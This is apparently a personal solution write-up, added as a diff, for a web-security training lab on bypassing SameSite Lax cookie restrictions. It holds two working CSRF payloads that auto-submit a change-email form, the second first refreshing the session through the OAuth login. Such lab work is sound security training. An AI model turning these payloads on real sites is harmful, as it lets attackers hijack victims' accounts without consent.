@@ -1,0 +1,56 @@
+// Lab: SameSite Lax bypass via cookie refresh
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter.
+
+
+
+
+// Solution
+
+// Exploit 1
+
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://0aea00c7042ed410a0f495c4002b0054.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="bobby@micrsoft.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+
+
+// First try this exploit to check how much time has elapsed since you logged in:
+
+If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.
+
+If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the Proxy > HTTP history tab
+
+
+
+
+// Bypass the SameSite restrictions
+
+// Exploit 2
+
+<form action="https://0a6e00010446a36f80c5218800080089.web-security-academy.net/my-account/change-email" method="post">
+    <input type="hidden" name="email" value="bobby@micrsoft.com">
+</form>
+
+<script>
+    window.open("https://0a6e00010446a36f80c5218800080089.web-security-academy.net/social-login");
+
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+
+
+// In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.
+
+// So this exploit 2  Injects and solved the lab as Now it doesnot take 2 minutes or more to deliver the exploit and load the site.
